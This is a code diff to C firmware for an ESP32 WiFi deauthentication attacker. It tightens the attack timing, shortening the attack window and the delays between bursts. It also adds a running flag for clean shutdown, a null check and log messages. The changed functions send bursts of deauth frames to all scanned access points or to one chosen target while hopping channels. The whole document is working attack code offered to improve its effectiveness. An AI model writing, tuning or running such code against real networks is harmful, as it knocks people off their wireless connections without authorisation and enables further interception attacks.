@@ -13,8 +13,9 @@
 #define DEAUTHER_TASK_PRIO 5
 // Syncronization times
 #define CHANNEL_SWITCH_DELAY 12   // Channel switch assestment time
-#define ATTACK_WINDOW        150  // RCO duration
-#define SOFTAP_REST_TIME     250   // Home channel time
+#define ATTACK_WINDOW        50  // RCO duration
+#define SOFTAP_REST_TIME     150   // Home channel time
+#define SINGLE_TARGET_ROOM   50
 
 static const char *TAG = "DEAUTHER";
 static TaskHandle_t deauther_task_handle = NULL;
@@ -24,6 +25,7 @@ static deauther_attack_type_t current_attack_type = DEAUTHER_ATTACK_DEAUTH_FRAME
 static uint8_t random_mac[6];
 static const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 static const uint8_t reason_code = 0x07;
+static volatile bool deauther_running = false;
 
 
 /**
@@ -213,6 +215,10 @@ static void deauther_send_frames(const target_info_t *target)
     if (broadcast_target) 
     {
         aps_info_t *aps = malloc(sizeof(aps_info_t));
+        if (aps == NULL) {
+            ESP_LOGE(TAG, "Failed to alloc aps, memory full!");
+            return;
+        }
         wifi_sniffer_get_aps(aps);
         if (aps == NULL || aps->count == 0) {
             free(aps);
@@ -226,7 +232,8 @@ static void deauther_send_frames(const target_info_t *target)
             bool exists = false;
             for (int k = 0; k < num_channels; k++) {
                 if (target_channels[k] == ch) {
-                    exists = true; break;
+                    exists = true; 
+                    break;
                 }
             }
             if (!exists) {
@@ -246,7 +253,7 @@ static void deauther_send_frames(const target_info_t *target)
                     // Burst di pacchetti
                     for(int k=0; k<7; k++) {
                         execute_attack_on_target(aps->ap[i].bssid, (const char*)aps->ap[i].ssid, current_ch);
-                        vTaskDelay(pdMS_TO_TICKS(5)); 
+                        vTaskDelay(pdMS_TO_TICKS(4)); 
                     }
                 }
                 if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) break;
@@ -268,7 +275,7 @@ static void deauther_send_frames(const target_info_t *target)
         int64_t start_time = esp_timer_get_time();
         while(true) {
             execute_attack_on_target(target->bssid, (const char*)target->ssid, target->channel);
-            vTaskDelay(pdMS_TO_TICKS(5)); 
+            vTaskDelay(pdMS_TO_TICKS(4)); 
             if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) break;
         }
         int64_t elapsed = (esp_timer_get_time() - start_time) / 1000;
@@ -276,7 +283,7 @@ static void deauther_send_frames(const target_info_t *target)
             vTaskDelay(pdMS_TO_TICKS((ATTACK_WINDOW - CHANNEL_SWITCH_DELAY) - elapsed));
         }
         /* Wait some time to permit the AP to communicate on his own channel */
-        vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
+        vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME + SINGLE_TARGET_ROOM));
     }
 }
 
@@ -300,7 +307,7 @@ static void deauther_task(void *pvParameters)
     /* First scan to fill APs list */
     wifi_sniffer_scan_fill_aps();
 
-    while(true)
+    while(deauther_running)
     {
         deauther_send_frames(target);
         vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
@@ -312,6 +319,9 @@ static void deauther_task(void *pvParameters)
             wifi_sniffer_scan_fill_aps();
         }
     }
+
+    wifi_stop_sniffing();
+    vTaskDelete(NULL);
 }
 
 
@@ -328,8 +338,10 @@ void deauther_start(const target_info_t *deauth_target, deauther_attack_type_t a
     }
 
     current_attack_type = attack_type;
+    deauther_running = true;
     target_set(deauth_target, TARGET_INFO_DEAUTHER);
     xTaskCreate(deauther_task, "deauther_task", 4096, NULL, DEAUTHER_TASK_PRIO, &deauther_task_handle);
+    ESP_LOGI(TAG, "Deauth Attack Started.");
 }
 
 
@@ -337,10 +349,16 @@ void deauther_stop(void)
 {
     if (deauther_task_handle == NULL)
     {
-        ESP_LOGE(TAG, "Deauther task is not running.");
+        ESP_LOGW(TAG, "Deauther task is not running.");
         return;
     }
-    wifi_stop_sniffing();
-    vTaskDelete(deauther_task_handle);
+
+    deauther_running = false;
+    int timeout = 0;
+    while (eTaskGetState(deauther_task_handle) != eDeleted && timeout < 50) {
+        vTaskDelay(pdMS_TO_TICKS(100));
+        timeout++;
+    }
     deauther_task_handle = NULL;
+    ESP_LOGI(TAG, "Deauth Attack Stopped.");
 }
